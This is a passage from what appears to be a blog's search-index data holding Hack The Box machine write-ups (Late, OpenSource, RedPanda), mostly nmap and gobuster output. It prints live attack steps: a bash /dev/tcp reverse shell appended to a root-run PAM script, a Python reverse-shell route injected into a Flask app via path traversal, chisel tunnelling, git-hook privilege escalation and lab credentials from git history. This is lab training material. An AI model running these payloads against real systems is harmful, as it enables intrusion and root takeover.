stable connection Root Enumerate Interesting script that svc_acc can write to And was modified in last 5 minutes The content of the script #!/bin/bash RECIPIENT=\u0026#34;root@late.htb\u0026#34; SUBJECT=\u0026#34;Email from Server Login: SSH Alert\u0026#34; BODY=\u0026#34; A SSH login was detected. User: $PAM_USER User IP Host: $PAM_RHOST Service: $PAM_SERVICE TTY: $PAM_TTY Date: `date` Server: `uname -a` \u0026#34; if [ ${PAM_TYPE} = \u0026#34;open_session\u0026#34; ]; then echo \u0026#34;Subject:${SUBJECT} ${BODY}\u0026#34; | /usr/sbin/sendmail ${RECIPIENT} fi We see that it is related with pam Let\u0026rsquo;s check pam\u0026rsquo;s config files svc_acc@late:/tmp$ grep -r ssh-alert.sh /etc/ /etc/pam.d/sshd:session required pam_exec.so /usr/local/sbin/ssh-alert.sh It looks that script send email to root@late.htb when new ssh login occur We can test it using pspy and try ssh And it happens to be true We can modify script and get our shell But when I tried modifying it, I couldn\u0026rsquo;t lsattr shows a attribute set, which only allows appending svc_acc@late:/tmp$ lsattr /usr/local/sbin/ssh-alert.sh -----a--------e--- /usr/local/sbin/ssh-alert.sh So we can do echo \u0026quot;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.16.5/7777 0\u0026gt;\u0026amp;1\u0026quot; \u0026gt;\u0026gt; /usr/local/sbin/ssh-alert.sh Connect via ssh again and get `root ","date":"August 28, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/late/images/late.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/late/","summary":"Late Enumeration nmap â””â”€$ nmap -Pn -p- 10.10.11.156 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-28 12:33 BST Nmap scan report for 10.10.11.156 (10.10.11.156) Host is up (0.16s latency). Not shown: 65533 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 696.11 seconds â””â”€$ nmap -Pn -sC -sV 10.10.11.156 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-28 12:33 BST Nmap scan report for 10.","tags":["HTB","ocr","flask","tesseract","ssti","jinja2","payloadsallthethings","hacktricks","linpeas","pspy","chattr","lsattr","extended-attributes"],"title":"[HTB] Machine: Late"},{"categories":null,"contents":"MetaTwo Enumeration ","date":"August 28, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/metatwo/images/metatwo.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/metatwo/","summary":"MetaTwo Enumeration ","tags":["HTB"],"title":"[HTB] Machine: MetaTwo"},{"categories":null,"contents":"OpenSource Enumeration nmap â””â”€$ nmap -Pn -p- 10.10.11.164 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-28 18:01 BST Stats: 0:11:43 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan Connect Scan Timing: About 97.88% done; ETC: 18:13 (0:00:15 remaining) Nmap scan report for 10.10.11.164 (10.10.11.164) Host is up (0.15s latency). Not shown: 65533 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 3000/tcp filtered ppp â””â”€$ nmap -Pn -sC -sV 10.10.11.164 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-28 18:14 BST Stats: 0:01:00 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan Service scan Timing: About 50.00% done; ETC: 18:15 (0:00:42 remaining) Nmap scan report for 10.10.11.164 (10.10.11.164) Host is up (0.17s latency). Not shown: 997 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 1e:59:05:7c:a9:58:c9:23:90:0f:75:23:82:3d:05:5f (RSA) | 256 48:a8:53:e7:e0:08:aa:1d:96:86:52:bb:88:56:a0:b7 (ECDSA) |_ 256 02:1f:97:9e:3c:8e:7a:1c:7c:af:9d:5a:25:4b:b8:c8 (ED25519) 80/tcp open http Werkzeug/2.1.2 Python/3.10.3 |_http-title: upcloud - Upload files for Free! |_http-server-header: Werkzeug/2.1.2 Python/3.10.3 | fingerprint-strings: | GetRequest: | HTTP/1.1 200 OK | Server: Werkzeug/2.1.2 Python/3.10.3 | Date: Mon, 28 Aug 2023 17:13:51 GMT | Content-Type: text/html; charset=utf-8 | Content-Length: 5316 | Connection: close | \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; | \u0026lt;head\u0026gt; | \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; | \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1.0\u0026#34;\u0026gt; | \u0026lt;title\u0026gt;upcloud - Upload files for Free!\u0026lt;/title\u0026gt; | \u0026lt;script src=\u0026#34;/static/vendor/jquery/jquery-3.4.1.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; | \u0026lt;script src=\u0026#34;/static/vendor/popper/popper.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; | \u0026lt;script src=\u0026#34;/static/vendor/bootstrap/js/bootstrap.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; | \u0026lt;script src=\u0026#34;/static/js/ie10-viewport-bug-workaround.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; | \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;/static/vendor/bootstrap/css/bootstrap.css\u0026#34;/\u0026gt; | \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34; /static/vendor/bootstrap/css/bootstrap-grid.css\u0026#34;/\u0026gt; | \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34; /static/vendor/bootstrap/css/bootstrap-reboot.css\u0026#34;/\u0026gt; | \u0026lt;link rel= | HTTPOptions: | HTTP/1.1 200 OK | Server: Werkzeug/2.1.2 Python/3.10.3 | Date: Mon, 28 Aug 2023 17:13:52 GMT | Content-Type: text/html; charset=utf-8 | Allow: OPTIONS, HEAD, GET | Content-Length: 0 | Connection: close | RTSPRequest: | \u0026lt;!DOCTYPE HTML PUBLIC \u0026#34;-//W3C//DTD HTML 4.01//EN\u0026#34; | \u0026#34;http://www.w3.org/TR/html4/strict.dtd\u0026#34;\u0026gt; | \u0026lt;html\u0026gt; | \u0026lt;head\u0026gt; | \u0026lt;meta http-equiv=\u0026#34;Content-Type\u0026#34; content=\u0026#34;text/html;charset=utf-8\u0026#34;\u0026gt; | \u0026lt;title\u0026gt;Error response\u0026lt;/title\u0026gt; | \u0026lt;/head\u0026gt; | \u0026lt;body\u0026gt; | \u0026lt;h1\u0026gt;Error response\u0026lt;/h1\u0026gt; | \u0026lt;p\u0026gt;Error code: 400\u0026lt;/p\u0026gt; | \u0026lt;p\u0026gt;Message: Bad request version (\u0026#39;RTSP/1.0\u0026#39;).\u0026lt;/p\u0026gt; | \u0026lt;p\u0026gt;Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.\u0026lt;/p\u0026gt; | \u0026lt;/body\u0026gt; |_ \u0026lt;/html\u0026gt; 3000/tcp filtered ppp 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port80-TCP:V=7.94%I=7%D=8/28%Time=64ECD5F3%P=x86_64-pc-linux-gnu%r(GetR SF:equest,1039,\u0026#34;HTTP/1\\.1\\x20200\\x20OK\\r\\nServer:\\x20Werkzeug/2\\.1\\.2\\x20P SF:ython/3\\.10\\.3\\r\\nDate:\\x20Mon,\\x2028\\x20Aug\\x202023\\x2017:13:51\\x20GMT SF:\\r\\nContent-Type:\\x20text/html;\\x20charset=utf-8\\r\\nContent-Length:\\x20 SF:5316\\r\\nConnection:\\x20close\\r\\n\\r\\n\u0026lt;html\\x20lang=\\\u0026#34;en\\\u0026#34;\u0026gt;\\n\u0026lt;head\u0026gt;\\n\\x20 SF:\\x20\\x20\\x20\u0026lt;meta\\x20charset=\\\u0026#34;UTF-8\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;meta\\x20name= SF:\\\u0026#34;viewport\\\u0026#34;\\x20content=\\\u0026#34;width=device-width,\\x20initial-scale=1\\.0\\\u0026#34;\u0026gt;\\ SF:n\\x20\\x20\\x20\\x20\u0026lt;title\u0026gt;upcloud\\x20-\\x20Upload\\x20files\\x20for\\x20Free! SF:\u0026lt;/title\u0026gt;\\n\\n\\x20\\x20\\x20\\x20\u0026lt;script\\x20src=\\\u0026#34;/static/vendor/jquery/jque SF:ry-3\\.4\\.1\\.min\\.js\\\u0026#34;\u0026gt;\u0026lt;/script\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;script\\x20src=\\\u0026#34;/stat SF:ic/vendor/popper/popper\\.min\\.js\\\u0026#34;\u0026gt;\u0026lt;/script\u0026gt;\\n\\n\\x20\\x20\\x20\\x20\u0026lt;script SF:\\x20src=\\\u0026#34;/static/vendor/bootstrap/js/bootstrap\\.min\\.js\\\u0026#34;\u0026gt;\u0026lt;/script\u0026gt;\\n\\ SF:x20\\x20\\x20\\x20\u0026lt;script\\x20src=\\\u0026#34;/static/js/ie10-viewport-bug-workaround SF:\\.js\\\u0026#34;\u0026gt;\u0026lt;/script\u0026gt;\\n\\n\\x20\\x20\\x20\\x20\u0026lt;link\\x20rel=\\\u0026#34;stylesheet\\\u0026#34;\\x20href SF:=\\\u0026#34;/static/vendor/bootstrap/css/bootstrap\\.css\\\u0026#34;/\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;li SF:nk\\x20rel=\\\u0026#34;stylesheet\\\u0026#34;\\x20href=\\\u0026#34;\\x20/static/vendor/bootstrap/css/boo SF:tstrap-grid\\.css\\\u0026#34;/\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;link\\x20rel=\\\u0026#34;stylesheet\\\u0026#34;\\x20hr SF:ef=\\\u0026#34;\\x20/static/vendor/bootstrap/css/bootstrap-reboot\\.css\\\u0026#34;/\u0026gt;\\n\\n\\x20 SF:\\x20\\x20\\x20\u0026lt;link\\x20rel=\u0026#34;)%r(HTTPOptions,C7,\u0026#34;HTTP/1\\.1\\x20200\\x20OK\\r\\ SF:nServer:\\x20Werkzeug/2\\.1\\.2\\x20Python/3\\.10\\.3\\r\\nDate:\\x20Mon,\\x2028\\ SF:x20Aug\\x202023\\x2017:13:52\\x20GMT\\r\\nContent-Type:\\x20text/html;\\x20cha SF:rset=utf-8\\r\\nAllow:\\x20OPTIONS,\\x20HEAD,\\x20GET\\r\\nContent-Length:\\x20 SF:0\\r\\nConnection:\\x20close\\r\\n\\r\\n\u0026#34;)%r(RTSPRequest,1F4,\u0026#34;\u0026lt;!DOCTYPE\\x20HTM SF:L\\x20PUBLIC\\x20\\\u0026#34;-//W3C//DTD\\x20HTML\\x204\\.01//EN\\\u0026#34;\\n\\x20\\x20\\x20\\x20\\x SF:20\\x20\\x20\\x20\\\u0026#34;http://www\\.w3\\.org/TR/html4/strict\\.dtd\\\u0026#34;\u0026gt;\\n\u0026lt;html\u0026gt;\\n\\x SF:20\\x20\\x20\\x20\u0026lt;head\u0026gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\u0026lt;meta\\x20http-equ SF:iv=\\\u0026#34;Content-Type\\\u0026#34;\\x20content=\\\u0026#34;text/html;charset=utf-8\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x SF:20\\x20\\x20\\x20\\x20\\x20\u0026lt;title\u0026gt;Error\\x20response\u0026lt;/title\u0026gt;\\n\\x20\\x20\\x20\\x2 SF:0\u0026lt;/head\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;body\u0026gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\u0026lt;h1\u0026gt;E SF:rror\\x20response\u0026lt;/h1\u0026gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\u0026lt;p\u0026gt;Error\\x20code SF::\\x20400\u0026lt;/p\u0026gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\u0026lt;p\u0026gt;Message:\\x20Bad\\x20req SF:uest\\x20version\\x20\\(\u0026#39;RTSP/1\\.0\u0026#39;\\)\\.\u0026lt;/p\u0026gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\ SF:x20\u0026lt;p\u0026gt;Error\\x20code\\x20explanation:\\x20HTTPStatus\\.BAD_REQUEST\\x20-\\x20 SF:Bad\\x20request\\x20syntax\\x20or\\x20unsupported\\x20method\\.\u0026lt;/p\u0026gt;\\n\\x20\\x20 SF:\\x20\\x20\u0026lt;/body\u0026gt;\\n\u0026lt;/html\u0026gt;\\n\u0026#34;); Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Web Server gobuster â””â”€$ gobuster dir -u http://10.10.11.164 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x txt --no-error =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.11.164 [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: txt [+] Timeout: 10s =============================================================== 2023/08/28 18:18:08 Starting gobuster in directory enumeration mode =============================================================== /download (Status: 200) [Size: 2489147] /console (Status: 200) [Size: 1563] Foothold If we visit /download we download source files It indicates that the app is running in docker container â””â”€$ tree -L 2 . â”œâ”€â”€ app â”‚Â â”œâ”€â”€ app â”‚Â â”œâ”€â”€ INSTALL.md â”‚Â â”œâ”€â”€ public â”‚Â â””â”€â”€ run.py â”œâ”€â”€ build-docker.sh â”œâ”€â”€ config â”‚Â â””â”€â”€ supervisord.conf â””â”€â”€ Dockerfile Let\u0026rsquo;s start by analyzing git dev branch git checkout dev We have proxy creds removed in the third commit: dev01:Soulless_Developer#2022 Also Dockerfile indicates that flask is in debug mode In master branch views.py we have only 2 routes import os from app.utils import get_file_name from flask import render_template, request, send_file from app import app @app.route(\u0026#39;/\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def upload_file(): if request.method == \u0026#39;POST\u0026#39;: f = request.files[\u0026#39;file\u0026#39;] file_name = get_file_name(f.filename) file_path = os.path.join(os.getcwd(), \u0026#34;public\u0026#34;, \u0026#34;uploads\u0026#34;, file_name) f.save(file_path) return render_template(\u0026#39;success.html\u0026#39;, file_url=request.host_url + \u0026#34;uploads/\u0026#34; + file_name) return render_template(\u0026#39;upload.html\u0026#39;) @app.route(\u0026#39;/uploads/\u0026lt;path:path\u0026gt;\u0026#39;) def send_report(path): path = get_file_name(path) return send_file(os.path.join(os.getcwd(), \u0026#34;public\u0026#34;, \u0026#34;uploads\u0026#34;, path)) While in dev branch we have 4 Which we see in actual box, so probably dev app is currently running Moreover we saw console route also in gobuster import os from app.utils import get_file_name from flask import render_template, request, send_file from app import app @app.route(\u0026#39;/\u0026#39;) def index(): return render_template(\u0026#39;index.html\u0026#39;) @app.route(\u0026#39;/download\u0026#39;) def download(): return send_file(os.path.join(os.getcwd(), \u0026#34;app\u0026#34;, \u0026#34;static\u0026#34;, \u0026#34;source.zip\u0026#34;)) @app.route(\u0026#39;/upcloud\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def upload_file(): if request.method == \u0026#39;POST\u0026#39;: f = request.files[\u0026#39;file\u0026#39;] file_name = get_file_name(f.filename) file_path = os.path.join(os.getcwd(), \u0026#34;public\u0026#34;, \u0026#34;uploads\u0026#34;, file_name) f.save(file_path) return render_template(\u0026#39;success.html\u0026#39;, file_url=request.host_url + \u0026#34;uploads/\u0026#34; + file_name) return render_template(\u0026#39;upload.html\u0026#39;) @app.route(\u0026#39;/uploads/\u0026lt;path:path\u0026gt;\u0026#39;) def send_report(path): path = get_file_name(path) return send_file(os.path.join(os.getcwd(), \u0026#34;public\u0026#34;, \u0026#34;uploads\u0026#34;, path)) /console We have a potential lfi in upcloud route file_name = get_file_name(f.filename) file_path = os.path.join(os.getcwd(), \u0026#34;public\u0026#34;, \u0026#34;uploads\u0026#34;, file_name) If we read the docs If a segment is an absolute path (which on Windows requires both a drive and a root), then all previous segments are ignored and joining continues from the absolute path segment. If we visit http://10.10.11.164/uploads//etc/passwd, it results in error We can utilize get_file_name function in utils.py, which replaces ../ So if we send http://10.10.11.164/uploads/..//etc/passwd, it could work Since app is running in debug mode, it will reload source files whenever there are changes occur So we can try overwriting views.py using upcloud route (both uploads and upcloud use os.path.join) For example adding one more route with web shell or reverse shell We know the location of the app is in /app based on Dockerfile Modify views.py Add revshell route with reverse shell code ... @app.route(\u0026#39;/revshell\u0026#39;) def revshell(): import socket import os import pty s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) s.connect((\u0026#34;10.10.16.5\u0026#34;,6666)) os.dup2(s.fileno(),0) os.dup2(s.fileno(),1) os.dup2(s.fileno(),2) pty.spawn(\u0026#34;sh\u0026#34;) Let\u0026rsquo;s start listener and upload malicious source file We need to intercept the request and change the filename I had weird symbols, but after upgrading the shell they dissappeared User Enumerate We know it\u0026rsquo;s a container / # ifconfig eth0 Link encap:Ethernet HWaddr 02:42:AC:11:00:07 inet addr:172.17.0.7 Bcast:172.17.255.255 Mask:255.255.0.0 UP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1 RX packets:995159 errors:0 dropped:0 overruns:0 frame:0 TX packets:994203 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:0 RX bytes:86315357 (82.3 MiB) TX bytes:155143921 (147.9 MiB) lo Link encap:Local Loopback inet addr:127.0.0.1 Mask:255.0.0.0 UP LOOPBACK RUNNING MTU:65536 Metric:1 RX packets:0 errors:0 dropped:0 overruns:0 frame:0 TX packets:0 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:1000 RX bytes:0 (0.0 B) TX bytes:0 (0.0 B) / # ip route default via 172.17.0.1 dev eth0 172.17.0.0/16 dev eth0 scope link src 172.17.0.7 I was stuck here for a while, until I saw a port 3000 in nmap results which was filtered So I tried wget that port from container (curl is not installed) It\u0026rsquo;s a Gitea Let\u0026rsquo;s upload chisel and configure port forwarding Container: ./chisel client 10.10.16.5:9001 R:3000:172.17.0.1:3000, forward remote(R) port 3000 (attack box) to 172.17.0.1:3000 Attack box: ./chisel server -p 9001 --reverse Now we can check Gitea from our attack box Use creds for dev01 that were found before We have home-backup repo with .ssh and keys in it Let\u0026rsquo;s download them ssh using the key Don\u0026rsquo;t forget chmod 600 id_rsa Root No sudo rights Creds for dev01 works linpeas shows git-sync script in /usr/local/bin/ pspy also shows the same script running every minute The content of the git-sync dev01@opensource:/tmp$ cat /usr/local/bin/git-sync #!/bin/bash cd /home/dev01/ if ! git status --porcelain; then echo \u0026#34;No changes\u0026#34; else day=$(date +\u0026#39;%Y-%m-%d\u0026#39;) echo \u0026#34;Changes detected, pushing..\u0026#34; git add . git commit -m \u0026#34;Backup for ${day}\u0026#34; git push origin main fi We can utilize git-hooks So that whenever someone tries to commit dev01\u0026rsquo;s home directory, the custom script will be launched ( because we know that it\u0026rsquo;s being backed up by script above periodically) According to docs, everything with .sample is skipped Let\u0026rsquo;s create a reverse shell script in hooks directory ...The pre-commit hook is run first, before you even type in a commit message..., so let\u0026rsquo;s name our script pre-commit Get root flag ","date":"August 28, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/opensource/images/opensource.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/opensource/","summary":"OpenSource Enumeration nmap â””â”€$ nmap -Pn -p- 10.10.11.164 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-28 18:01 BST Stats: 0:11:43 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan Connect Scan Timing: About 97.88% done; ETC: 18:13 (0:00:15 remaining) Nmap scan report for 10.10.11.164 (10.10.11.164) Host is up (0.15s latency). Not shown: 65533 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 3000/tcp filtered ppp â””â”€$ nmap -Pn -sC -sV 10.","tags":["HTB","upload","source-code","git","git-hooks","flask","directory-traversal","file-read","flask-debug","flask-debug-pin","chisel","gitea","pspy","werkzeug","werkzeug-debug"],"title":"[HTB] Machine: OpenSource"},{"categories":null,"contents":"Photobomb Enumeration ","date":"August 28, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/photobomb/images/photobomb.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/photobomb/","summary":"Photobomb Enumeration ","tags":["HTB"],"title":"[HTB] Machine: Photobomb"},{"categories":null,"contents":"RedPanda Enumeration nmap â””â”€$ nmap -p- -Pn 10.10.11.170 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-29 19:41 BST Nmap scan report for 10.10.11.170 (10.10.11.170) Host is up (0.14s latency). Not shown: 65533 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 8080/tcp open http-proxy â””â”€$ nmap -p22,8080 -sC -sV -Pn 10.10.11.170 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-29 19:50 BST Nmap scan report for 10.10.11.170 (10.10.11.170) Host is up (0.10s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA) | 256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA) |_ 256 18ðŸ’¿9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519) 8080/tcp open http-proxy |_http-title: Red Panda Search | Made with Spring Boot |_http-open-proxy: Proxy might be redirecting requests | fingerprint-strings: | GetRequest: | HTTP/1.1 200 | Content-Type: text/html;charset=UTF-8 | Content-Language: en-US | Date: Tue, 29 Aug 2023 18:50:20 GMT | Connection: close | \u0026lt;!DOCTYPE html\u0026gt; | \u0026lt;html lang=\u0026#34;en\u0026#34; dir=\u0026#34;ltr\u0026#34;\u0026gt; | \u0026lt;head\u0026gt; | \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; | \u0026lt;meta author=\u0026#34;wooden_k\u0026#34;\u0026gt; | \u0026lt;!--Codepen by khr2003: https://codepen.io/khr2003/pen/BGZdXw --\u0026gt; | \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;css/panda.css\u0026#34; type=\u0026#34;text/css\u0026#34;\u0026gt; | \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;css/main.css\u0026#34; type=\u0026#34;text/css\u0026#34;\u0026gt; | \u0026lt;title\u0026gt;Red Panda Search | Made with Spring Boot\u0026lt;/title\u0026gt; | \u0026lt;/head\u0026gt; | \u0026lt;body\u0026gt; | \u0026lt;div class=\u0026#39;pande\u0026#39;\u0026gt; | \u0026lt;div class=\u0026#39;ear left\u0026#39;\u0026gt;\u0026lt;/div\u0026gt; | \u0026lt;div class=\u0026#39;ear right\u0026#39;\u0026gt;\u0026lt;/div\u0026gt; | \u0026lt;div class=\u0026#39;whiskers left\u0026#39;\u0026gt; | \u0026lt;span\u0026gt;\u0026lt;/span\u0026gt; | \u0026lt;span\u0026gt;\u0026lt;/span\u0026gt; | \u0026lt;span\u0026gt;\u0026lt;/span\u0026gt; | \u0026lt;/div\u0026gt; | \u0026lt;div class=\u0026#39;whiskers right\u0026#39;\u0026gt; | \u0026lt;span\u0026gt;\u0026lt;/span\u0026gt; | \u0026lt;span\u0026gt;\u0026lt;/span\u0026gt; | \u0026lt;span\u0026gt;\u0026lt;/span\u0026gt; | \u0026lt;/div\u0026gt; | \u0026lt;div class=\u0026#39;face\u0026#39;\u0026gt; | \u0026lt;div class=\u0026#39;eye | HTTPOptions: | HTTP/1.1 200 | Allow: GET,HEAD,OPTIONS | Content-Length: 0 | Date: Tue, 29 Aug 2023 18:50:20 GMT | Connection: close | RTSPRequest: | HTTP/1.1 400 | Content-Type: text/html;charset=utf-8 | Content-Language: en | Content-Length: 435 | Date: Tue, 29 Aug 2023 18:50:20 GMT | Connection: close | \u0026lt;!doctype html\u0026gt;\u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt;\u0026lt;head\u0026gt;\u0026lt;title\u0026gt;HTTP Status 400 | Request\u0026lt;/title\u0026gt;\u0026lt;style type=\u0026#34;text/css\u0026#34;\u0026gt;body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}\u0026lt;/style\u0026gt;\u0026lt;/head\u0026gt;\u0026lt;body\u0026gt;\u0026lt;h1\u0026gt;HTTP Status 400 |_ Request\u0026lt;/h1\u0026gt;\u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt; 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port8080-TCP:V=7.94%I=7%D=8/29%Time=64EE3E10%P=x86_64-pc-linux-gnu%r(Ge SF:tRequest,690,\u0026#34;HTTP/1\\.1\\x20200\\x20\\r\\nContent-Type:\\x20text/html;charse SF:t=UTF-8\\r\\nContent-Language:\\x20en-US\\r\\nDate:\\x20Tue,\\x2029\\x20Aug\\x20 SF:2023\\x2018:50:20\\x20GMT\\r\\nConnection:\\x20close\\r\\n\\r\\n\u0026lt;!DOCTYPE\\x20htm SF:l\u0026gt;\\n\u0026lt;html\\x20lang=\\\u0026#34;en\\\u0026#34;\\x20dir=\\\u0026#34;ltr\\\u0026#34;\u0026gt;\\n\\x20\\x20\u0026lt;head\u0026gt;\\n\\x20\\x20\\x20\\ SF:x20\u0026lt;meta\\x20charset=\\\u0026#34;utf-8\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;meta\\x20author=\\\u0026#34;woode SF:n_k\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;!--Codepen\\x20by\\x20khr2003:\\x20https://codepe SF:n\\.io/khr2003/pen/BGZdXw\\x20--\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;link\\x20rel=\\\u0026#34;stylesh SF:eet\\\u0026#34;\\x20href=\\\u0026#34;css/panda\\.css\\\u0026#34;\\x20type=\\\u0026#34;text/css\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20\\x2 SF:0\u0026lt;link\\x20rel=\\\u0026#34;stylesheet\\\u0026#34;\\x20href=\\\u0026#34;css/main\\.css\\\u0026#34;\\x20type=\\\u0026#34;text/c SF:ss\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;title\u0026gt;Red\\x20Panda\\x20Search\\x20\\|\\x20Made\\x20w SF:ith\\x20Spring\\x20Boot\u0026lt;/title\u0026gt;\\n\\x20\\x20\u0026lt;/head\u0026gt;\\n\\x20\\x20\u0026lt;body\u0026gt;\\n\\n\\x20\\ SF:x20\\x20\\x20\u0026lt;div\\x20class=\u0026#39;pande\u0026#39;\u0026gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\u0026lt;div\\x20clas SF:s=\u0026#39;ear\\x20left\u0026#39;\u0026gt;\u0026lt;/div\u0026gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\u0026lt;div\\x20class=\u0026#39;ear\\x20r SF:ight\u0026#39;\u0026gt;\u0026lt;/div\u0026gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\u0026lt;div\\x20class=\u0026#39;whiskers\\x20left\u0026#39;\u0026gt; SF:\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\u0026lt;span\u0026gt;\u0026lt;/span\u0026gt;\\n\\x20\\x20\\x20\\x SF:20\\x20\\x20\\x20\\x20\\x20\\x20\u0026lt;span\u0026gt;\u0026lt;/span\u0026gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x SF:20\\x20\\x20\u0026lt;span\u0026gt;\u0026lt;/span\u0026gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\u0026lt;/div\u0026gt;\\n\\x20\\x20\\x20\\x SF:20\\x20\\x20\u0026lt;div\\x20class=\u0026#39;whiskers\\x20right\u0026#39;\u0026gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\ SF:x20\\x20\u0026lt;span\u0026gt;\u0026lt;/span\u0026gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\u0026lt;span\u0026gt;\u0026lt;/span\u0026gt;\\n\\x SF:20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\u0026lt;span\u0026gt;\u0026lt;/span\u0026gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\u0026lt;/ SF:div\u0026gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\u0026lt;div\\x20class=\u0026#39;face\u0026#39;\u0026gt;\\n\\x20\\x20\\x20\\x20\\x SF:20\\x20\\x20\\x20\u0026lt;div\\x20class=\u0026#39;eye\u0026#34;)%r(HTTPOptions,75,\u0026#34;HTTP/1\\.1\\x20200\\x SF:20\\r\\nAllow:\\x20GET,HEAD,OPTIONS\\r\\nContent-Length:\\x200\\r\\nDate:\\x20Tu 